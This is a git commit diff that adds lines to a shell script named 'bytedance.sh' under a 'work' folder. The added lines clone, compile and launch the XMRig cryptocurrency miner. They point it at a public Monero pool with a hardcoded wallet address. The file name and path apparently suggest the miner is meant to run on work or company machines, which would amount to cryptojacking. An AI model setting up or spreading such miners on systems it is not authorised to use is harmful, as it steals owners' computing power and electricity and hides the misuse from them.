d470d5aee6a2d649a640cd99b9e4f3232f2eb907
pornnewbee <65003745+pornnewbee@users.noreply.github.com>
2025-12-23 19:00:45 +0800

    Update bytedance.sh

--- sub/work/bytedance.sh
+++ sub/work/bytedance.sh
@@ -2,3 +2,9 @@ sudo apt update
 sudo apt upgrade -y
 sudo apt install git build-essential cmake automake libtool autoconf pkg-config -y
 sudo apt install libhwloc-dev libssl-dev libuv1-dev -y
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig
+mkdir build && cd build
+cmake ..
+make -j$(nproc)
+./xmrig -o pool.supportxmr.com:7777 -u 49UP9rrnTKj4s4Y6is1LweKzF5V3hCAioao75qJG24525BoACWRb8ss5qS9KfaBaTAK77SRYksPHNdX3eWwiPJ1p3h6buJh -p someofbitch -k
